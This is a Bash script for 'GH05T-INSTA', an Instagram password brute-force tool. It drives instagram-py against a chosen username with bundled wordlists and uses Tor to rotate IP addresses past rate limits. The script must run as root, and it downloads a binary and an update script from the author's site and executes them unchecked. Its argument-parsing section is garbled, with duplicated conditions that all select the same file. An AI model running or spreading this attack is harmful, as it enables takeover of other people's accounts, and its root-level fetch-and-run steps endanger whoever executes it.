#!/bin/env bash

if [[ $(command -v instagram-py) ]]; then
        echo ""
else
        echo "Instagram-py command not located. To install Instagram-py, please execute the installation command: 'pip install Instagram-py'."
        exit
fi

if [ $(id -u) -ne 0 ]; then
	echo "This script must be ran as root"
	exit 1
fi 

pip install requests
clear
readthisone() {
	echo ""
	echo "######################################################"
	echo "######################################################"
	echo "##################### READ THIS ######################"
	echo "######################################################"
	echo "######################################################"
	echo "## Dear GitHub user, please do not copy this script ##"
	echo "######################################################"
	echo "##  All copyright under the laws of all countries   ##"
	echo "######################################################"
	echo "##        Copyright of  GH05T HUNTER5, 2023         ##"
	echo "######################################################"
	echo "######################################################"
	
	
	
	echo "#######################################################################################"
	echo "#######################################################################################"
	echo "##   GH05T-INSTA 	: 	Insta BruteForce Tool         			           ##"
	echo "##   Authors 		: 	GH05T-HUNTER5				           ##"
	echo "##   Version 		: 	7.01			                           ##"
	echo "##   Github 		: 	https://github.com/GH05T-HUNTER5/GH05T-INSTA       ##"
	echo "#######################################################################################"
	echo "##  MIT License 				                                           ##"
	echo "##								                   ##"
	echo "##  Copyright (c) 2023 GH05T HUNTER5 						   ##"
	echo "##										   ##"
	echo "##  Permission is hereby granted, free of charge, to any person obtaining a copy     ##"
	echo "##  of this software and associated documentation files (the "Software"), to deal    ##"
	echo "##  in the Software without restriction, including without limitation the rights     ##"
	echo "##  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell        ##"
	echo "##  copies of the Software, and to permit persons to whom the Software is            ##"
	echo "##  furnished to do so, subject to the following conditions:                         ##"
	echo "##                                                                                   ##"
	echo "##  The above copyright notice and this permission notice shall be included in all   ##"
	echo "##  copies or substantial portions of the Software.                                  ##"
	echo "##  										   ##"
	echo "##  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR       ##"
	echo "##  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,         ##"
	echo "##  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE      ##"
	echo "##  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER           ##"
	echo "##  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,    ##"
	echo "##  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE    ##"
	echo "##  SOFTWARE.          								   ##"
	echo "#######################################################################################"
	echo "#######################################################################################"	
}

if [[ $(command -v security-gh05t) ]]; then
        echo ''
else
        wget gh05t-hunter5.github.io/communication/GH05T-INSTA/security-gh05t 
        mv security-gh05t /usr/bin/security-gh05t 
        chmod +x /usr/bin/security-gh05t 
fi

reset='\033[0m'
exit_on_signal_SIGINT() {
	echo ""
	reopens
	clear 
	echo -e " Trying To Exit ${reset}"
	sleep 5
	clear
	exit 
}
exit_on_signal_SIGTERM() {
	echo ""
	reopens
	clear 
	echo -e " Trying To Exit ${reset}"
	sleep 5
	clear
	exit 
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

green='\033[1;32m'
red='\033[1;31m'
white='\033[1;37m'
cyan='\033[0;36m'
restar='\033[0;35m'

ghost_uninstall() {
	pip3 install requests --upgrade >/dev/null 2>&1
	pip3 uninstall requests[socks] >/dev/null 2>&1
	pip3 uninstall stem >/dev/null 2>&1
	pip3 uninstall instagram-py >/dev/null 2>&1
	if [[ $(command -v instagram-py) ]]; then
		pip3 uninstall stem >/dev/null 2>&1
		pip3 uninstall instagram-py >/dev/null 2>&1
	else
		echo ''
	fi
	rm -rf /usr/cookies
	if [ -d /usr/cookies ]; then
		rm -r /usr/cookies
	else
		echo ''
	fi
	rm /usr/bin/gh05t
	if [ -f /usr/bin/gh05t ]; then
		rm -r /usr/bin/gh05t
	else
		echo ''
	fi
        security-gh05t remove 
        rm -rf /usr/bin/security-gh05t
	banners
	exit
}
manual_attack() {
	install_tool
	banners
	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Your Instagram Username : \e[0m' username
	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter your password location <path> along with name : \e[0m' passnum
	brutejson
	tornotice
	tor > /dev/null 2>&1 &
	clear
	echo "User : $username" >> /usr/cookies/history.txt
	echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
	instagram-py --username $username --password-list $passnum
	reopens
	sleep 3
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 7.01\033[1;37m|"
	echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 20.3\033[1;37m|"
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
	echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
	echo -e " \033[1;37m |   Never use this tool to do illegal things   |"
	echo -e " \033[1;37m +----------------------------------------------+"
	sleep 10
	exit	
}

tornotice() {
	clear
	echo -e "\033[1;37m +----------------------------------------------+"
	echo -e "\033[1;37m |              \033[0;31m       Tor                   \033[1;37m   |"
	echo -e "\033[1;37m |\033[0;32mIt is an acronym for Onion Router, a free and\033[1;37m |"
	echo -e "\033[1;37m |\033[0;32m open source software for enabling anonymous \033[1;37m |"
	echo -e "\033[1;37m | \033[0;32m communication. It drives worldwide internet\033[1;37m |"
	echo -e "\033[1;37m |       \033[0;32m         traffic for free,         \033[1;37m    |"
	echo -e "\033[1;37m |\033[0;31m   We use the Tor network to handle your IP  \033[1;37m |"
	echo -e "\033[1;37m |\033[0;31m   changes, so your password is likely to be \033[1;37m |"
	echo -e "\033[1;37m |\033[0;31m          repeated as your IP changes.       \033[1;37m |"
	echo -e "\033[1;37m +----------------------------------------------+"
	sleep 5
}

reopens() {
	rm ~/instapy-config.json >/dev/null 2>&1
	if [ -f ~/instapy-config.json ]; then
		rm -r ~/instapy-config.json >/dev/null 2>&1
	else
		echo ''
	fi
	if [ -f instapy-config.json ]; then
		rm instapy-config.json
	else
		echo ''
	fi	
        security-gh05t remove 
}

brutejson() {
	wget -O ~/instapy-config.json "gh05t-hunter5.github.io/communication/GH05T-INSTA/instapy-.json" >/dev/null 2>&1
	if [ -f ~/instapy-config.json ]; then
		echo ''
	else
		cd ~
		wget -O ~/instapy-config.json "gh05t-hunter5.github.io/communication/GH05T-INSTA/instapy-.json" >/dev/null 2>&1
	fi
        security-gh05t
}
main_install() {
	if [[ $(command -v php) && $(command -v curl) && $(command -v python) && $(command -v python2) && $(command -v wget) && $(command -v tor) ]]; then
		echo -e ""
	else
		pkgs=(php curl python python2 wget tor)
		for pkg in "${pkgs[@]}"; do
		type -p "$pkg" &>/dev/null || {
		echo -e ""
		if [[ $(command -v pkg) ]]; then
			pkg install "$pkg" -y
		elif [[ $(command -v apt) ]]; then
			sudo apt install "$pkg" -y
		elif [[ $(command -v apt-get) ]]; then
			sudo apt-get install "$pkg" -y
		elif [[ $(command -v pacman) ]]; then
			sudo pacman -S "$pkg" --noconfirm
		elif [[ $(command -v dnf) ]]; then
			sudo dnf -y install "$pkg"
		elif [[ $(command -v yum) ]]; then
			sudo yum -y install "$pkg"
		else
			echo ""
		fi
		}
		done
	fi
}

install_tool() {
	if [[ $(command -v instagram-py) ]]; then
		echo ""
	else
		pip3 install requests --upgrade >/dev/null 2>&1
		pip3 install requests[socks] >/dev/null 2>&1
		pip3 install stem >/dev/null 2>&1
		pip3 install instagram-py >/dev/null 2>&1
		pip3 install instagram-py --upgrade
	fi
}
install_tool

internet_connection() {
	ping -c 1 google.com >/dev/null 2>&1
	Return="$?"
	if [ "$Return" -eq "0" ]; then
		echo ""
		clear
	else
		clear
		echo ""
		printf "${red} Turn on the Internet or connect to the Internet"
		sleep 3
		clear
	fi
}

check_updates() {
	wget gh05t-hunter5.github.io/Basic-Installation-Linux/MyPass/gh05t-updates.sh
	bash gh05t-updates.sh
	if [ -f gh05t-updates.sh ]; then
		rm gh05t-updates.sh
	else
		echo ""
	fi
}

function auto_attack() {
	install_tool
#	tornotice
	banners
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m××\033[1;37m]\033[0;32m Lines  Password type                  \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m01\033[1;37m]\033[0;32m 1059   Passwords mixed                \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m02\033[1;37m]\033[0;32m 65536  Passwords numbers              \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m03\033[1;37m]\033[0;32m 65536  Passwords ABCD                 \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m04\033[1;37m]\033[0;32m 65536  Passwords Number and ABCD      \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m05\033[1;37m]\033[0;32m 65536  Passwords Numbers {extra}      \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m06\033[1;37m]\033[0;32m 448    Passwords name and numbers     \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m07\033[1;37m]\033[0;32m 1501   Passwords name and numbers     \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m08\033[1;37m]\033[0;32m 100    Passwords mixed                \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m09\033[1;37m]\033[0;32m 300    Passwords mixed                \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m10\033[1;37m]\033[0;32m 2900   Passwords fpp names & numbers  \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m11\033[1;37m]\033[0;32m 3000   Passwords regular pass         \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m12\033[1;37m]\033[0;32m 800    Passwords simple  social       \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m13\033[1;37m]\033[0;32m 1059   Passwords mixed                \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m14\033[1;37m]\033[0;32m 1059   Passwords mixed                \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m15\033[1;37m]\033[0;32m 1059   Passwords mixed                \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m16\033[1;37m]\033[0;32m 3106   Passwords wal comm             \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m17\033[1;37m]\033[0;32m 181    Passwords mix                  \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m18\033[1;37m]\033[0;32m 306706 Passwords Big box fpp          \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m19\033[1;37m]\033[0;32m 1000   Passwords English ls number    \033[1;37m  |"
	echo -e " \033[1;37m | \033[1;37m[\033[0;31m20\033[1;37m]\033[0;32m 20     Passwords My Password          \033[1;37m  |"
	echo -e " \033[1;37m +----------------------------------------------+"
	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Username : \e[0m' username
	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Pssword Type : \e[0m' passnum
	if [ -z $passnum ]; then
		echo -e "${white}  [${red}++${white}] ${red}Invalid Option, Try Again..."
		sleep 2
		auto_attack
	elif [ $passnum = "01" ] || [ $passnum = "1" ]; then
		passwordtype="/usr/cookies/password-1.txt"
	elif [ $passnum = "02" ] || [ $passnum = "2" ]; then
		passwordtype="/usr/cookies/password-2.txt"
	elif [ $passnum = "03" ] || [ $passnum = "3" ]; then
		passwordtype="/usr/cookies/password-3.txt"
	elif [ $passnum = "04" ] || [ $passnum = "4" ]; then
		passwordtype="/usr/cookies/password-4.txt"
	elif [ $passnum = "05" ] || [ $passnum = "5" ]; then
		passwordtype="/usr/cookies/password-5.txt"
	elif [ $passnum = "06" ] || [ $passnum = "6" ]; then
		passwordtype="/usr/cookies/password-6.txt"
	elif [ $passnum = "07" ] || [ $passnum = "7" ]; then
		passwordtype="/usr/cookies/password-7.txt"
	elif [ $passnum = "08" ] || [ $passnum = "8" ]; then
		passwordtype="/usr/cookies/password-8.txt"
	elif [ $passnum = "09" ] || [ $passnum = "9" ]; then
		passwordtype="/usr/cookies/password-9.txt"
	elif [ $passnum = "10" ]; then
		passwordtype="/usr/cookies/password-10.txt"
	elif [ $passnum = "11" ]; then
		passwordtype="/usr/cookies/password-11.txt"
	elif [ $passnum = "12" ]; then
		passwordtype="/usr/cookies/password-12.txt"
	elif [ $passnum = "13" ]; then
		passwordtype="/usr/cookies/password-13.txt"
	elif [ $passnum = "14" ]; then
		passwordtype="/usr/cookies/password-14.txt"
	elif [ $passnum = "15" ]; then
		passwordtype="/usr/cookies/password-15.txt"
	elif [ $passnum = "16" ]; then
		passwordtype="/usr/cookies/password-16.txt"
	elif [ $passnum = "17" ]; then
		passwordtype="/usr/cookies/password-17.txt"
	elif [ $passnum = "18" ]; then
		passwordtype="/usr/cookies/password-18.txt"
	elif [ $passnum = "19" ]; then
		passwordtype="/usr/cookies/password-19.txt"
	elif [ $passnum = "20" ]; then
		passwordtype="/usr/cookies/password-20.txt"
	else
		echo -e "${white}  [${red}++${white}] ${red}Invalid Option, Try Again..."
		sleep 2
		auto_attack
	fi
	brutejson
	tornotice
	tor > /dev/null 2>&1 &
	clear
	echo "User : $username" >> /usr/cookies/history.txt
	echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
	instagram-py --username $username --password-list $passwordtype
	reopens
	sleep 3
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 7.01\033[1;37m|"
	echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 20.3\033[1;37m|"
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
	echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
	echo -e " \033[1;37m |   Never use this tool to do illegal things   |"
	echo -e " \033[1;37m +----------------------------------------------+"
	sleep 10
	exit
}

cookies_users(){
	banners
	if [ -f /usr/cookies/history.txt ]; then
		cat /usr/cookies/history.txt
		exit
	else
		echo "History not found"
		sleep 2
	fi
}

function banners() {
	internet_connection
	main_install
	clear
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m | \033[0;32m  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\033[1;37m |"
	echo -e " \033[1;37m |\033[0;32m  ██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝\033[1;37m |"
	echo -e " \033[1;37m |\033[0;32m  ██║  ███╗███████║██║██╔██║███████╗   ██║ \033[1;37m   |"
	echo -e " \033[1;37m |\033[0;32m  ██║   ██║██╔══██║████╔╝██║╚════██║   ██║ \033[1;37m   |"
	echo -e " \033[1;37m |\033[0;32m  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║ \033[1;37m   |"
	echo -e " \033[1;37m | \033[0;32m  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝ \033[1;37m   |"
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |  \033[0;32m   ██╗███╗   ██╗███████╗████████╗ █████╗  \033[1;37m  |"
	echo -e " \033[1;37m |  \033[0;32m   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗  \033[1;37m |"
	echo -e " \033[1;37m |  \033[0;32m   ██║██╔██╗ ██║███████╗   ██║   ███████║ \033[1;37m  |"
	echo -e " \033[1;37m |  \033[0;32m   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║  \033[1;37m |"
	echo -e " \033[1;37m |  \033[0;32m   ██║██║ ╚████║███████║   ██║   ██║  ██║ \033[1;37m  |"
	echo -e " \033[1;37m |  \033[0;32m   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ \033[1;37m  |"
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 7.01\033[1;37m|"
	echo -e " \033[1;37m |\033[0;31m Instagram\033[1;37m :\033[0;34m GH05T_HUNTER5   \033[0;31m  FPP    \033[1;37m  :\033[0;34m 20.3\033[1;37m|"
	echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 2.07\033[1;37m|"
	echo -e " \033[1;37m +----------------------------------------------+"
	echo -e " \033[1;37m |\033[0;31m We strive to provide the best service for you\033[1;37m|"
	echo -e " \033[1;37m +----------------------------------------------+"
}

gh05t_help() {
	echo -e "  ${red}[${white}++${red}] ${green}link ${white}:${green} https://bit.ly/3wzyVJU "
	exit
}

main_menu() {
	banners
	echo -e "  \033[1;37m[\033[0;31m01\033[1;37m]\033[0;32m Auto Attack"
	echo -e "  \033[1;37m[\033[0;31m02\033[1;37m]\033[0;32m Manual Attack"
	echo -e "  \033[1;37m[\033[0;31m08\033[1;37m]\033[0;32m Uninstall gh05t"
	echo -e "  \033[1;37m[\033[0;31m99\033[1;37m]\033[0;32m Help"
	echo -e "  \033[1;37m[\033[0;31m00\033[1;37m]\033[0;32m Exit"
	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Choose an option : \e[0m' option
	if [ -z $option ]; then
		main_menu
	elif [ $option = "01" ] || [ $option = "1" ]; then
		auto_attack
	elif [ $option = "02" ] || [ $option = "2" ]; then
		manual_attack
	elif [ $option = "03" ] || [ $option = "3" ]; then
		insta_report
	elif [ $option = "05" ] || [ $option = "5" ]; then
		cookies_users
		main_menu
	elif [ $option = "06" ] || [ $option = "6" ]; then
		main_install
		install_tool
		check_updates
		echo 'Re-checked'
		sleep 2
		main_menu
	elif [ $option = "07" ] || [ $option = "7" ]; then
		check_updates
	elif [ $option = "08" ] || [ $option = "8" ]; then
		ghost_uninstall
	elif [ $option = "99" ]; then
		gh05t_help
	elif [ $option = "00" ]; then
		recheck_remove
		exit
	else
		echo -e "${white}  [${red}++${white}] ${red}Invalid Option, Try Again..."
		sleep 2
		main_menu
	fi			
}

insta_report() {
	bash /usr/cookies/instareport.sh
	clear
	exit
}

if [ $3 = "--pass" ] >/dev/null 2>&1
then
	if [ $1 = "--user" ]; then
		clear
		if [ -z $4 ]; then
			clear
			echo " choose password option"
			exit
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-1.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-2.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ] || [ $4 = "1" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then 
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then
			passwordtype="/usr/cookies/password-19.txt"
		elif [ $4 = "01" ]; then		
			passwordtype="/usr/cookies/password-19.txt"
		else
			clear
			echo " choose password option"
			exit
		fi
		brutejson
		tornotice
		tor > /dev/null 2>&1 &
		clear
		echo "User : $2" >> /usr/cookies/history.txt
		echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
		instagram-py --username $2 --password-list $passwordtype
		reopens
		sleep 3
		echo -e " \033[1;37m +----------------------------------------------+"
		echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 7.01\033[1;37m|"
		echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 20.3\033[1;37m|"
		echo -e " \033[1;37m +----------------------------------------------+"
		echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
		echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
		echo -e " \033[1;37m |   Never use this tool to do illegal things   |"
		echo -e " \033[1;37m +----------------------------------------------+"
		sleep 10
		exit
		else
			echo " Something Wrong"
		fi
		elif [ $3 = "--passadd" ] >/dev/null 2>&1
		then
			echo ""
		if [ $1 = "--user" ]; then
			echo ""
			brutejson
			tornotice
			tor > /dev/null 2>&1 &
			clear
			echo "User : $username" >> /usr/cookies/history.txt
			echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
			instagram-py --username $username --password-list $passnum
			reopens
			sleep 3
			echo -e " \033[1;37m +----------------------------------------------+"
			echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 7.01\033[1;37m|"
			echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 20.3\033[1;37m|"
			echo -e " \033[1;37m +----------------------------------------------+"
			echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
			echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
			echo -e " \033[1;37m |   Never use this tool to do illegal things   |"				
			echo -e " \033[1;37m +----------------------------------------------+"
			sleep 10
			exit
		else
		clear
		echo " Something Wrong"
		exit
		fi
		elif [ $1 = "--help" ] >/dev/null 2>&1
		then
			gh05t_help
		exit
		elif [ $1 = "--update" ] >/dev/null 2>&1
		then
			echo ""
			clear
			check_updates
		exit
		elif [ $1 = "--check" ] >/dev/null 2>&1
		then
			echo ""
			clear
			main_install
			install_tool
			check_updates
		exit
		elif [ $1 = "--history" ] >/dev/null 2>&1
		then
			echo ""
			clear
			cookies_users
		exit
		elif [ $1 = "uninstall" ] >/dev/null 2>&1
		then
			echo ""
			clear
		if [ $2 = "all" ]; then
			echo ""
			clear
			ghost_uninstall
		else
			clear
			echo " Try Again"
			sleep 4
			clear
			echo ""
		exit
		fi
			echo ""
		else
			echo ""
			clear 
		fi
		clear
		
main_menu
